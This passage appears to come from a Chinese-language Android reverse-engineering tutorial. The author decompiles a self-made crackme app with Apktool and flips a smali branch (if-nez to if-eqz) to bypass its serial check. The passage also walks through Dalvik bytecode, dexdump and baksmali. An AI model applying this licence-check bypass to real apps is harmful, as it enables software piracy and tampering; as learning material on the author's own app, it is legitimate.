<span class="operator">=</span> (EditText) findViewById(R.id.editTextTextPersonName2);</span><br><span class="line">    <span class="type">Button</span> <span class="variable">btn_register</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">    btn_register.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!checkSN(edit_username.getText().toString().trim(), edit_sn.getText().toString().trim()))</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, R.string.unsuccessed, Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>, R.string.successed, Toast.LENGTH_SHORT).show();</span><br><span class="line">                btn_register.setEnabled(<span class="literal">false</span>);</span><br><span class="line">                setTitle(R.string.registered);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时<code>R.string.xxxx</code>出错，这是因为我们还没在<code>strings.xml</code>中定义这些字符串。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;unregister&quot;</span>&gt;</span>程序未注册<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;registered&quot;</span>&gt;</span>程序已注册<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;successed&quot;</span>&gt;</span>注册成功！<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;unsuccessed&quot;</span>&gt;</span>注册失败！<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/posts/d368aa06/2.1.2.png" class="" title="定义字符串"><p>设置好后，代码就不报错了。使用Genymotion插件启动虚拟设备，点击绿色三角符号将项目打包成APK发送至虚拟设备并在虚拟设备上运行。</p><p>别忘了弄布局，否则下图就是反面教材。</p><img src="/posts/d368aa06/2.1.3.png" class="" title="设计界面"><p>我们刚才在<code>strings.xml</code>中定义的字符串可以在设计界面时就设置好。</p><img src="/posts/d368aa06/2.1.4.png" class="" title="设计界面"><p>可以用hint属性(灰色)来提示用户输入，如果用text属性(黑色)会直接在框中输入，用户如果需要输入则要删掉框中文本再输入，text属性如果使用一般是默认值。</p><img src="/posts/d368aa06/2.1.5.png" class="" title="设计界面"><p>效果如下图，有内味了。</p><img src="/posts/d368aa06/2.1.6.png" class="" title="效果图"><h2 id="2-2-破解Android程序"><a href="#2-2-破解Android程序" class="headerlink" title="2.2 破解Android程序"></a>2.2 破解Android程序</h2><p>破解Android程序的第一步就是要将APK文件反编译，生成Smali格式的反汇编代码，阅读Smali文件的代码来理解程序的运行机制，或更进一步反编译成Java源码，更好理解程序流程。</p><p>将APK文件反汇编成Smali格式需要用到<a href="https://ibotpeaches.github.io/Apktool/">Apktool</a>工具，官网也很明确地给出了用法，两个命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反汇编APK文件：apktool d[ecode] [OPTS] &lt;file.apk&gt; [&lt;dir&gt;]</span><br><span class="line">编译APK文件：apktool b[uild] [OPTS] [&lt;app_path&gt;] [&lt;out_file&gt;]</span><br></pre></td></tr></table></figure><p>也可以用<a href="https://down.52pojie.cn/Tools/Android_Tools/AndroidKiller_v1.3.1.zip">Android Killer</a>图形化工具(下称AK)，它集成了apktool工具和APK签名工具，可以查看和修改Smali代码，将APK文件安装到虚拟设备等，所以还挺方便的。</p><p>点击Android Studio(下称AS)中的小锤子图标(Make Project)将上面代码打包成APK文件放到本地，路径为<code>D:\Java\Android\crackme\app\build\intermediates\apk\debug\app-debug.apk</code>，也可能在<code>D:\Java\Android\crackme\app\build\outputs\apk\debug\app-debug.apk</code>，多找找。将该APK文件反汇编成Smali代码到当前目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Java\Android\crackme\app\build\intermediates\apk\debug&gt; apktool d app-debug.apk</span><br><span class="line">I: Using Apktool 2.6.1 on app-debug.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: C:\Users\dell\AppData\Local\apktool\framework\1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding file-resources...</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Baksmaling classes3.dex...</span><br><span class="line">I: Baksmaling classes2.dex...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br><span class="line">PS D:\Java\Android\crackme\app\build\intermediates\apk\debug&gt;</span><br></pre></td></tr></table></figure><p>如何寻找突破口是分析一个程序的关键。对于一般的Android来说，错误提示信息通常是指引关键代码的风向标。在错误提示附近一般是程序的核心验证代码。错误提示是Android程序中的字符串资源，开发Android程序时，这些字符串可能硬编码到源码中，也可能引用自<code>res\values\strings.xml</code>。APK在打包时，<code>strings.xml</code>中的字符串被加密存储为<code>resources.arsc</code>文件保存到APK程序包中，APK被成功反编译后这个文件也被解密出来了。</p><p>如果是硬编码，字符串以Unicode编码的方式写在了Smali代码中；如果是<code>strings.xml</code>中，字符串就是我们看到的文本模样。</p><img src="/posts/d368aa06/2.1.7.png" class="" title="strings.xml"><p>开发Android程序时，<code>strings.xml</code>文件中的所有字符串资源都在<code>R.java</code>文件的String类被标识，每个字符串都有唯一的int类型索引值，使用Apktool反编译APK文件后，所有的索引值保存在<code>strings.xml</code>文件同目录下的<code>public.xml</code>文件中。</p><img src="/posts/d368aa06/2.2.1.png" class="" title="public.xml"><p>unsuccessed的id值为0x7f0e006d，在smali目录中搜索含有内容为0x7f0e006d的文件，最后发现只有<code>MainActivity$1.smali</code>文件一处调用，代码如下：</p><img src="/posts/d368aa06/2.2.2.png" class="" title="查找0x7f0e006d"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"># virtual methods</span><br><span class="line">.method public onClick(Landroid/view/View;)V</span><br><span class="line">    .locals 3</span><br><span class="line">    .param p1, &quot;v&quot;    # Landroid/view/View;</span><br><span class="line"></span><br><span class="line">    .line 29</span><br><span class="line">    iget-object v0, p0, Lcom/example/crackme/MainActivity$1;-&gt;this$0:Lcom/example/crackme/MainActivity;</span><br><span class="line"></span><br><span class="line">    iget-object v1, p0, Lcom/example/crackme/MainActivity$1;-&gt;val$edit_username:Landroid/widget/EditText;</span><br><span class="line"># 取用户名存到v1</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/lang/String;-&gt;trim()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    iget-object v2, p0, Lcom/example/crackme/MainActivity$1;-&gt;val$edit_sn:Landroid/widget/EditText;</span><br><span class="line"># 取注册码存到v2</span><br><span class="line">    invoke-virtual &#123;v2&#125;, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2&#125;, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2&#125;, Ljava/lang/String;-&gt;trim()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v0, v1, v2&#125;, Lcom/example/crackme/MainActivity;-&gt;access$000(Lcom/example/crackme/MainActivity;Ljava/lang/String;Ljava/lang/String;)Z</span><br><span class="line"># 将v0、v1、v2放进MainActivity中的access$000中进行运算，返回值为Boolean类型</span><br><span class="line">    move-result v0</span><br><span class="line"># 将结果放到v0</span><br><span class="line">    const/4 v1, 0x0</span><br><span class="line"></span><br><span class="line">    if-nez v0, :cond_0</span><br><span class="line"># 如果v0不等于0，则跳到:cond_0。否则继续往下执行。</span><br><span class="line"># 继续往下执行就会执行到0x7f0e006d的地方，也就是注册失败。所以一定要跳到:cond_0</span><br><span class="line"># 将if-nez修改为if-eqz</span><br><span class="line">    .line 30</span><br><span class="line">    iget-object v0, p0, Lcom/example/crackme/MainActivity$1;-&gt;this$0:Lcom/example/crackme/MainActivity;</span><br><span class="line"></span><br><span class="line">    const v2, 0x7f0e006d # unsuccessed</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v0, v2, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;II)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    goto :goto_0</span><br><span class="line"></span><br><span class="line">    .line 33</span><br><span class="line">    :cond_0</span><br><span class="line">    iget-object v0, p0, Lcom/example/crackme/MainActivity$1;-&gt;this$0:Lcom/example/crackme/MainActivity;</span><br><span class="line"></span><br><span class="line">    const v2, 0x7f0e006b # successed</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;v0, v2, v1&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;II)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    .line 34</span><br><span class="line">    iget-object v0, p0, Lcom/example/crackme/MainActivity$1;-&gt;val$btn_register:Landroid/widget/Button;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v1&#125;, Landroid/widget/Button;-&gt;setEnabled(Z)V</span><br><span class="line"></span><br><span class="line">    .line 35</span><br><span class="line">    iget-object v0, p0, Lcom/example/crackme/MainActivity$1;-&gt;this$0:Lcom/example/crackme/MainActivity;</span><br><span class="line"></span><br><span class="line">    const v1, 0x7f0e0068 # registered</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v1&#125;, Lcom/example/crackme/MainActivity;-&gt;setTitle(I)V</span><br><span class="line"></span><br><span class="line">    .line 37</span><br><span class="line">    :goto_0</span><br><span class="line">    return-void</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>修改完后保存，使用Apktool编译。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b app-debug</span><br></pre></td></tr></table></figure><p>天啊编译完还要签名，还要配置签名工具。答应我，用AK就好，点击“编译”它就会自动编译并签名，很方便。</p><img src="/posts/d368aa06/2.2.3.png" class="" title="查找0x7f0e006d"><img src="/posts/d368aa06/2.2.4.png" class="" title="注册成功"><h1 id="3-进入Android-Dalvik虚拟机"><a href="#3-进入Android-Dalvik虚拟机" class="headerlink" title="3. 进入Android Dalvik虚拟机"></a>3. 进入Android Dalvik虚拟机</h1><h2 id="3-1-Dalvik虚拟机与Java虚拟机的区别"><a href="#3-1-Dalvik虚拟机与Java虚拟机的区别" class="headerlink" title="3.1 Dalvik虚拟机与Java虚拟机的区别"></a>3.1 Dalvik虚拟机与Java虚拟机的区别</h2><p>Dalvik虚拟机与传统的Java虚拟机有着许多不同点，两者并不兼容，它们显著的不同点主要表现在以下几个方面：</p><ul><li><p>Java虚拟机运行的是Java字节码，Dalvik虚拟机运行的是Dalvik字节码。</p><p>传统的Java程序经过编译，生成Java字节码保存在class文件中，Java虚拟机通过解码class文件中的内容来运行程序。而Dalvik虚拟机运行的是Dalvik字节码，所有的Dalvik字节码由Java字节码转换而来，并被打包到一个DEX(Dalvik Executable)可执行文件中，Dalvik虚拟机通过解释DEX文件来执行这些字节码。</p></li><li><p>Dalvik可执行文件体积更小。</p><p>Android SDK中有一个叫dx(现名为d8)的工具负责将Java字节码转换为Dalvik字节码。dx工具对Java常量池的压缩，使得相同的字符串、常量在DEX文件中只出现一次，从而减少了文件的体积。</p><img src="/posts/d368aa06/3.1.1.png" class="" title="Java文件转换为DEX文件"></li><li><p>Java虚拟机与Dalvik虚拟机架构不同。</p><p>Java虚拟机基于栈架构。程序在运行时虚拟机需要频繁地从栈上读取或写入数据，这个过程需要更多的指令分派与内存访问次数。</p><p>Dalvik虚拟机基于寄存器架构。数据的访问通过寄存器间直接传递。</p></li></ul><p>编写简单的Java代码来对比Java字节码与Dalvik字节码的区别：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Hello.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">return</span> (a + b) * (a - b);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">        System.out.println(hello.foo(<span class="number">5</span>, <span class="number">3</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成class文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Hello.java</span><br></pre></td></tr></table></figure><p>编译<code>Hello.class</code>生成Java字节码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\dell\Desktop&gt; javap -c Hello.class</span><br><span class="line">Compiled from &quot;Hello.java&quot;</span><br><span class="line">public class Hello &#123;</span><br><span class="line">  public Hello();</span><br><span class="line">    Code:</span><br><span class="line">       0: aload_0</span><br><span class="line">       1: invokespecial #1                  // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">       4: return</span><br><span class="line"></span><br><span class="line">  public int foo(int, int);</span><br><span class="line">    Code:</span><br><span class="line">       0: iload_1</span><br><span class="line">       1: iload_2</span><br><span class="line">       2: iadd</span><br><span class="line">       3: iload_1</span><br><span class="line">       4: iload_2</span><br><span class="line">       5: isub</span><br><span class="line">       6: imul</span><br><span class="line">       7: ireturn</span><br><span class="line"></span><br><span class="line">  public static void main(java.lang.String[]);</span><br><span class="line">    Code:</span><br><span class="line">       0: new           #2                  // class Hello</span><br><span class="line">       3: dup</span><br><span class="line">       4: invokespecial #3                  // Method &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">       7: astore_1</span><br><span class="line">       8: getstatic     #4                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">      11: aload_1</span><br><span class="line">      12: iconst_5</span><br><span class="line">      13: iconst_3</span><br><span class="line">      14: invokevirtual #5                  // Method foo:(II)I</span><br><span class="line">      17: invokevirtual #6                  // Method java/io/PrintStream.println:(I)V</span><br><span class="line">      20: return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将class文件编译成DEX文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar dx.jar --dex --output=Hello.dex Hello.class</span><br></pre></td></tr></table></figure><blockquote><p>运行jar包命令：java -jar xxx.jar</p></blockquote><p>使用<code>dexdump.exe</code>将<code>Hello.dex</code>文件编译成Dalvik字节码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">PS D:\Java\Android\sdk\build-tools\30.0.3&gt; .\dexdump.exe -d C:\Users\Dell\Desktop\Hello.dex</span><br><span class="line">Processing &#x27;C:\Users\Dell\Desktop\Hello.dex&#x27;...</span><br><span class="line">Opened &#x27;C:\Users\Dell\Desktop\Hello.dex&#x27;, DEX version &#x27;035&#x27;</span><br><span class="line">Class #0            -</span><br><span class="line">  Class descriptor  : &#x27;LHello;&#x27;</span><br><span class="line">  Access flags      : 0x0001 (PUBLIC)</span><br><span class="line">  Superclass        : &#x27;Ljava/lang/Object;&#x27;</span><br><span class="line">  Interfaces        -</span><br><span class="line">  Static fields     -</span><br><span class="line">  Instance fields   -</span><br><span class="line">  Direct methods    -</span><br><span class="line">    #0              : (in LHello;)</span><br><span class="line">      name          : &#x27;&lt;init&gt;&#x27;</span><br><span class="line">      type          : &#x27;()V&#x27;</span><br><span class="line">      access        : 0x10001 (PUBLIC CONSTRUCTOR)</span><br><span class="line">      code          -</span><br><span class="line">      registers     : 1</span><br><span class="line">      ins           : 1</span><br><span class="line">      outs          : 1</span><br><span class="line">      insns size    : 4 16-bit code units</span><br><span class="line">00014c:                                        |[00014c] Hello.&lt;init&gt;:()V</span><br><span class="line">00015c: 7010 0400 0000                         |0000: invoke-direct &#123;v0&#125;, Ljava/lang/Object;.&lt;init&gt;:()V // method@0004</span><br><span class="line">000162: 0e00                                   |0003: return-void</span><br><span class="line">      catches       : (none)</span><br><span class="line">      positions     :</span><br><span class="line">        0x0000 line=1</span><br><span class="line">      locals        :</span><br><span class="line">        0x0000 - 0x0004 reg=0 this LHello;</span><br><span class="line"></span><br><span class="line">    #1              : (in LHello;)</span><br><span class="line">      name          : &#x27;main&#x27;</span><br><span class="line">      type          : &#x27;([Ljava/lang/String;)V&#x27;</span><br><span class="line">      access        : 0x0009 (PUBLIC STATIC)</span><br><span class="line">      code          -</span><br><span class="line">      registers     : 5</span><br><span class="line">      ins           : 1</span><br><span class="line">      outs          : 3</span><br><span class="line">      insns size    : 17 16-bit code units</span><br><span class="line">000164:                                        |[000164] Hello.main:([Ljava/lang/String;)V</span><br><span class="line">000174: 2200 0100                              |0000: new-instance v0, LHello; // type@0001</span><br><span class="line">000178: 7010 0000 0000                         |0002: invoke-direct &#123;v0&#125;, LHello;.&lt;init&gt;:()V // method@0000</span><br><span class="line">00017e: 6201 0000                              |0005: sget-object v1, Ljava/lang/System;.out:Ljava/io/PrintStream; // field@0000</span><br><span class="line">000182: 1252                                   |0007: const/4 v2, #int 5 // #5</span><br><span class="line">000184: 1233                                   |0008: const/4 v3, #int 3 // #3</span><br><span class="line">000186: 6e30 0100 2003                         |0009: invoke-virtual &#123;v0, v2, v3&#125;, LHello;.foo:(II)I // method@0001</span><br><span class="line">00018c: 0a00                                   |000c: move-result v0</span><br><span class="line">00018e: 6e20 0300 0100                         |000d: invoke-virtual &#123;v1, v0&#125;, Ljava/io/PrintStream;.println:(I)V // method@0003</span><br><span class="line">000194: 0e00                                   |0010: return-void</span><br><span class="line">      catches       : (none)</span><br><span class="line">      positions     :</span><br><span class="line">        0x0000 line=9</span><br><span class="line">        0x0005 line=10</span><br><span class="line">        0x0010 line=11</span><br><span class="line">      locals        :</span><br><span class="line">        0x0000 - 0x0011 reg=4 (null) [Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">  Virtual methods   -</span><br><span class="line">    #0              : (in LHello;)</span><br><span class="line">      name          : &#x27;foo&#x27;</span><br><span class="line">      type          : &#x27;(II)I&#x27;</span><br><span class="line">      access        : 0x0001 (PUBLIC)</span><br><span class="line">      code          -</span><br><span class="line">      registers     : 5</span><br><span class="line">      ins           : 3</span><br><span class="line">      outs          : 0</span><br><span class="line">      insns size    : 6 16-bit code units</span><br><span class="line">000198:                                        |[000198] Hello.foo:(II)I</span><br><span class="line">0001a8: 9000 0304                              |0000: add-int v0, v3, v4</span><br><span class="line">0001ac: 9101 0304                              |0002: sub-int v1, v3, v4</span><br><span class="line">0001b0: b210                                   |0004: mul-int/2addr v0, v1</span><br><span class="line">0001b2: 0f00                                   |0005: return v0</span><br><span class="line">      catches       : (none)</span><br><span class="line">      positions     :</span><br><span class="line">        0x0000 line=5</span><br><span class="line">      locals        :</span><br><span class="line">        0x0000 - 0x0006 reg=2 this LHello;</span><br><span class="line">        0x0000 - 0x0006 reg=3 (null) I</span><br><span class="line">        0x0000 - 0x0006 reg=4 (null) I</span><br><span class="line"></span><br><span class="line">  source_file_idx   : 1 (Hello.java)</span><br></pre></td></tr></table></figure><p>可以看到，它们用各自的字节码描述<code>foo()</code>函数，Java需要8条指令，而Dalivik只需4条指令。</p><h2 id="3-2-Android系统架构"><a href="#3-2-Android系统架构" class="headerlink" title="3.2 Android系统架构"></a>3.2 Android系统架构</h2><p>Android系统架构采用分层思想，这样的好处是拥有减少各层之间的依赖性、便于独立分发、容易收敛问题和错误等优点。Android系统由Linux内核、函数库、Android运行时、应用程序框架、应用程序组成。Dalvik虚拟机属于Android运行时环境，它与一些核心库共同承担Android应用程序的运行工作。</p><img src="/posts/d368aa06/3.1.2.png" class="" title="Android系统架构"><p>Android系统启动加载完内核后，第一个执行的是init进程，init进程首先要做的是设备的初始化工作，然后读取<code>inic.rc</code>文件并启动系统中的重要外部程序Zygote。Zygote进程是Android所有进程的孵化器进程，它启动后会首先初始化Dalvik虚拟机，然后启动system_server并进入Zygote模式，通过socket等候命令。当执行一个Android应用程序时，system_server进程通过socket方式发送命令给Zygote，Zygote收到命令后通过fork自身创建一个Dalvik虚拟机的实例来执行应用程序的入口函数，这样一个程序就启动完成了。</p><p>Zygote提供了三种创建进程的方法：</p><ul><li>fork()，创建一个Zygote进程；</li><li>forkAndSpecialize()，创建一个非Zygote进程；</li><li>forSystemServer()，创建一个系统服务进程。</li></ul><p>当进程fork成功后，执行的工作就交给了Dalvik虚拟机。Dalvik虚拟机首先通过<code>loadClassFromDex()</code>函数完成类的装载工作，每个类被成功解析后都会拥有一个ClassObject类型的数据结构存储在运行时环境中，虚拟机使用gDvm.loadedClasses全局哈希表来存储与查询所有装载进来的类，字节码验证器使用<code>dvmVerifyCodeFlow()</code>函数对装入的代码进行校验，接着虚拟机调用<code>FindClass()</code>函数查找并装载main方法类，随后调用<code>dvmInterpret()</code>函数初始化解释器并执行字节码流。</p><h2 id="3-3-DEX文件反汇编"><a href="#3-3-DEX文件反汇编" class="headerlink" title="3.3 DEX文件反汇编"></a>3.3 DEX文件反汇编</h2><p>DEX文件的反汇编工具我们用BakSmali，BakSmali提供反汇编功能的同时，还支持使用Smali工具打包反汇编代码重新生成DEX文件，这个功能被广泛应用于APK文件的修改、补丁、破解等场合。（如果是class文件转换为DEX文件可用<code>dx.jar</code>或<code>smali.jar</code>工具）</p><p>反汇编DEX文件，在baksmaliout目录下生成<code>Hello.smali</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar baksmali.jar d -o baksmaliout Hello.dex</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 